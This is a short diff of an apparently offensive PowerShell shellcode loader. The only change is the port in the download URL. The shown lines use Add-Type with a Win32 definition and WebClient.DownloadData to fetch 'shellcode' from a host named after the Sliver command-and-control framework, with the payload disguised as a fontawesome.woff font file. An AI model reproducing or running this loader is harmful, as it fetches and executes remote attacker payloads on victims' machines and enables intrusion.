@@ -48,7 +48,7 @@ Add-Type $Win32
 
 
 
-$shellcode = (New-Object System.Net.WebCLient).DownloadData("https://sliver.nosfera0x2.com:443/fontawesome.woff")
+$shellcode = (New-Object System.Net.WebCLient).DownloadData("https://sliver.nosfera0x2.com/fontawesome.woff")
 
 if ($shellcode -eq $null) {Exit};
 
